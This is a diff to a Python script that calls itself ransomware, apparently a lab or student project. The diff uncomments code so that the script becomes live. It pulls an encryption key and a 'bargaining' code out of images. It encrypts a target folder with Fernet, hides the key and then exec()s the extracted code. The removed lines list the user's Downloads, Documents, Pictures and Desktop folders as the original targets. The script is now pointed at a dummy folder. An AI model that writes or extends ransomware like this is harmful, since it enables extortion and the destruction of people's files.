@@ -1,6 +1,6 @@
-'''#import os
-#from cryptography.fernet import Fernet
-#from extract import extract_file
+import os
+from cryptography.fernet import Fernet
+from extract import extract_file
 
 
 def encrypt_file(filename: str, key: str):
@@ -66,7 +66,7 @@ def main():
         key_found: bool = os.path.exists(image_containing_key)
         bargain_code_found: bool = os.path.exists(image_containing_bargaining_code)
         if key_found and bargain_code_found:
-            #code_to_bargain_with_user: str = extract_file(image_containing_bargaining_code, passphrase)
+            code_to_bargain_with_user: str = extract_file(image_containing_bargaining_code, passphrase)
             key: str = extract_file(image_containing_key, passphrase)
 
             # Encrypts and removes the key from the working directory to hide from sight
@@ -91,16 +91,13 @@ def main():
 
     # Represents folders to avoid encrypting for safety of host computer whilst maintaining functionality
     # of the ransomware.
-    blacklist: list[str] = [os.getcwd()]
+    blacklist: list[str] = [os.getcwd(),
+                            "Images blacklisted from encryption"]
 
     # Directories to encrypt in their entirety
     # TODO: Update as needed for testing purposes
     directories_to_encrypt = [
-        "Shark Images"
-        # os.path.expanduser("~/Downloads"),
-        # os.path.expanduser("~/Documents"),
-        # os.path.expanduser("~/Pictures"),
-        # os.path.expanduser("~/Desktop")
+        "Dummy Folder to Encrypt"
     ]
 
     for directory in directories_to_encrypt:
@@ -109,10 +106,8 @@ def main():
     print("Encryption successful!")
 
     # Runs the bargaining application
-    #exec("import bargain_with_user")
-    #exec(f"{code_to_bargain_with_user}")
+    exec("import bargain_with_user")
+    exec(f"{code_to_bargain_with_user}")
 
 
 main()
-
-'''
